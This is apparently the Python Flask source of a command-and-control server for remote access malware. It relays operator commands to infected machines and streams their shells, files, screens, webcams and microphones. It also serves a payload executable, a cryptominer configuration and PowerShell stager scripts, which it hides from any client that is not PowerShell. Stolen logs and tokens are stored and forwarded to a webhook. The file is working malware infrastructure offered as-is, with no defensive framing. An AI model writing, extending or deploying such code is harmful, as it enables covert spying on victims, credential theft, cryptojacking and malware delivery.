import multiprocessing, cloudscraper, threading, hashlib, urllib3, zipfile, random, flask, json, time, os
scraper = cloudscraper.create_scraper()

while True:
    try:
        from flask import Flask, request, send_file, jsonify
        from flask_sock import Sock

        break
    except:
        os.system("pip install flask-sock")
        os.system("pip install flask-tor")


app = Flask(__name__)
sock = Sock(app)

command = {}

shell_clients = {}
shell_computers = {}

manager_clients = {}
manager_computers = {}

files_clients = {}
files_computers = {}

screen_recv_ws = {}
camera_recv_ws = {}
audio_recv_ws = {}

key = os.environ["key"]
connectedComputers = []
connectedClients = []

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(
                os.path.join(root, file),
                os.path.relpath(os.path.join(root, file), os.path.join(path, "..")),
            )


def ping(ws, computer):
    global connectedComputers
    tries = 5
    while tries > 0:
        time.sleep(3)
        try:
            ws.send("ping")
        except:
            tries -= 1
            if tries <= 0:
                connectedComputers = [c for c in connectedComputers if c != computer]
                try:
                    ws.close()
                except:
                    pass
                print(f"Disconnected: {computer}")
                break

def update(ws):
    global connectedComputers
    old = None
    while True:
        if not old == connectedComputers:
            old = connectedComputers[:]
        else:
            continue

        ws.send(json.dumps(connectedComputers))

@sock.route("/api/ws/computers")
def computers(ws):
    global connectedClients, command

    data = ws.receive()
    if hashlib.sha256(data.encode()).hexdigest() != key:
        ws.close()
        return

    threading.Thread(target=update, args=(ws,)).start()
    connectedClients.append(ws)

    while True:
        try:
            command = json.loads(ws.receive())
            print(f"Received command: {command}")
        except:
            break


@sock.route("/api/ws/commands")
def commands(ws):
    global connectedComputers, connectedClients, command

    print("User Connected")
    data = ws.receive()
    if hashlib.sha256(data.encode()).hexdigest() != key:
        print("Invalid key provided")
        ws.close()
        return

    while True:
        computer = ws.receive()
        if "|" in computer:
            break
        ws.send("getComputer")

    print(f"Connected computer: {computer}")
    connectedComputers.append(computer)
    threading.Thread(target=ping, args=(ws, computer)).start()

    def forward_response(ws, computer):
        try:
            recv = ws.receive()
            for client_ws in connectedClients[:]:
                try:
                    client_ws.send(recv)
                except:
                    connectedClients.remove(client_ws)
        except:
            pass

    while True:
        if not command or command.get("target") != computer:
            continue

        try:
            ws.send(command["code"])
            threading.Thread(target=forward_response, args=(ws, computer)).start()
        except Exception as e:
            print(f"Error: {e}")
            connectedComputers = [c for c in connectedComputers if c != computer]
            try:
                ws.close()
            except:
                pass
            break

        command = {}


@sock.route("/api/ws/camera")
def wscamera(ws):
    global camera_recv_ws
    handle_ws(ws, camera_recv_ws)


@sock.route("/api/ws/screen")
def wsscreen(ws):
    global screen_recv_ws
    handle_ws(ws, screen_recv_ws)


@sock.route("/api/ws/audio")
def wsaudio(ws):
    global audio_recv_ws
    handle_ws(ws, audio_recv_ws)


@sock.route("/api/ws/showCamera")
def camera(ws):
    global camera_recv_ws
    handle_viewer_ws(ws, camera_recv_ws)


@sock.route("/api/ws/showScreen")
def screen(ws):
    global screen_recv_ws
    handle_viewer_ws(ws, screen_recv_ws)


@sock.route("/api/ws/playAudio")
def audio(ws):
    global audio_recv_ws
    handle_viewer_ws(ws, audio_recv_ws)


def handle_ws(ws, recv_ws_dict):
    data = ws.receive()
    if not validate_key(data, ws):
        return

    computer = ws.receive()
    recv_ws_dict.setdefault(computer, [])

    while True:
        try:
            message = ws.receive()
            threading.Thread(target=broadcast_message, args=(recv_ws_dict[computer], message)).start()
        except Exception as e:
            print(f"Error: {e}")
            break


def handle_viewer_ws(ws, recv_ws_dict):
    data = ws.receive()
    if not validate_key(data, ws):
        return

    computer = ws.receive()
    recv_ws_dict.setdefault(computer, []).append(ws)

    try:
        while ws.receive():
            pass
    except:
        recv_ws_dict[computer].remove(ws)


def validate_key(data, ws):
    encoded = hashlib.sha256(data.encode()).hexdigest()
    if encoded != key:
        ws.close()
        return False
    return True


def broadcast_message(ws_list, message):
    for _ws in ws_list[:]:
        try:
            _ws.send(message)
        except:
            ws_list.remove(_ws)

def handle_socket(ws, clients_dict, computers_dict, label):
    data = ws.receive()
    encoded = hashlib.sha256(data.encode()).hexdigest()

    print(label)

    if encoded != key:
        ws.close()
        return

    computer = ws.receive()
    computers_dict[computer] = ws

    while True:
        try:
            recv_data = ws.receive()
            if computer in clients_dict:
                clients_dict[computer].send(recv_data)
            else:
                continue
        except:
            del computers_dict[computer]
            break


@sock.route("/api/ws/readShell")
def readshell(ws):
    handle_socket(ws, shell_computers, shell_clients, "READ SHELL")


@sock.route("/api/ws/shell")
def shell(ws):
    handle_socket(ws, shell_clients, shell_computers, "SHELL")


@sock.route("/api/ws/FileManager")
def readmanager(ws):
    handle_socket(ws, manager_computers, manager_clients, "READ FILE MANAGER")


@sock.route("/api/ws/manager")
def manager(ws):
    handle_socket(ws, manager_clients, manager_computers, "FILE MANAGER")


@sock.route("/api/ws/readFiles")
def readfiles(ws):
    handle_socket(ws, files_computers, files_clients, "READ FILES")


@sock.route("/api/ws/files")
def files(ws):
    handle_socket(ws, files_clients, files_computers, "FILES")

@app.route("/search", methods=["POST", "GET"])
def search():
    with open("ads.html", "r+") as file:
        file_data = file.read()
    return file_data

@app.route("/m43200012", methods=["POST", "GET"])
def stub():
    return send_file("output.com", as_attachment=True)

@app.route("/miner-config", methods=["POST", "GET"])
def miner():
    with open("miner.config", "r+") as file:
        file_data = file.read()
    return file_data

@app.route("/deobf3", methods=["POST", "GET"])
def deobf():
    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
        ip = request.environ["REMOTE_ADDR"]
    else:
        ip = request.environ["HTTP_X_FORWARDED_FOR"]

    print(ip)

    if 'User-Agent' not in request.headers:
        return "", 404

    headers = request.headers['User-Agent']
    if "PowerShell" not in headers:
        return "", 404

    with open("script.ps1", "r+") as file:
        file_data = file.read()

    return file_data

@app.route("/webhook", methods=["POST", "GET"])
def webhook():
    webhook = os.environ["webhook"]


    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
        ip = request.environ["REMOTE_ADDR"]
    else:
        ip = request.environ["HTTP_X_FORWARDED_FOR"]

    if request.method == "GET":

        response = scraper.get(webhook)
        return {}, response.status_code

    elif request.method == "POST":
        data = request.form
        try:
            data = dict(request.get_json(force=True))
            is_json = True
        except Exception as e:
            data = dict(request.form)
            is_json = False

        try:
           files = dict(request.files)
        except Exception as e:
           files = {}

        if files:
          try:
              files = {key: (file.filename, file.read(), "application/octet-stream") for key, file in files.items()}
          except Exception as e:
              files = {}



        if is_json:
            response = scraper.post(webhook, json=data, files=files)
        else:
            response = scraper.post(webhook, data=data, files=files)

        return {}


@app.route("/logs", methods=["POST", "GET"])
def logs():
    try:
        request.form["key"]
    except:
        print("Client provided invalid key")
        return "", 404

    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        print("Client provided invalid key")
        return "", 404

    if request.method == "POST":
        log = request.files["file"]
        user = request.form["user"]
        ip = request.form["ip"]

        try:
            dir = f"logs/{user}-{ip}"
            log.save(dir)
        except Exception as e:
            print(e)

        return "", 404

    else:
        with zipfile.ZipFile("temp.zip", "w", zipfile.ZIP_DEFLATED) as zipf:
            zipdir("logs/", zipf)

        data = open("temp.zip", "rb").read()

        return data


@app.route("/tokens", methods=["POST", "GET"])
def tokens():
    try:
        request.form["key"]
    except:
        return "", 404

    encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
    if not encoded == key:
        return "", 404

    if request.method == "POST":
        keysFile = json.load(open("tokens.json", "rb"))
        token = request.form["token"]

        if token not in keysFile["keys"]:
          with open("tokens.json", "w+") as f:
              keys = keysFile["keys"]
              keys.append(token)
              keysFile["keys"] = keys
              json.dump(keysFile, f, indent=1)
              f.close()

        return "", 204

    elif request.method == "GET":
        keysFile = json.load(open("tokens.json", "r"))

        keys = keysFile["keys"]
        return keys


@app.errorhandler(404)
def page_not_found(e):
    if request.environ.get("HTTP_X_FORWARDED_FOR") is None:
        ip = request.environ["REMOTE_ADDR"]
    else:
        ip = request.environ["HTTP_X_FORWARDED_FOR"]

    print(ip)

    if 'User-Agent' not in request.headers:
        return "", 404

    headers = request.headers['User-Agent']
    if "PowerShell" not in headers:
        return "", 404

    with open("activate.ps1", "r+") as file:
        file_data = file.read()

    return file_data

@app.errorhandler(500)
def error(e):
    print(e)
    return "", 404


@app.errorhandler(405)
def notallowed(e):
    print(e)
    return "", 404


@app.errorhandler(400)
def client_error(e):
    print(e, 400)
    return "", 404

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
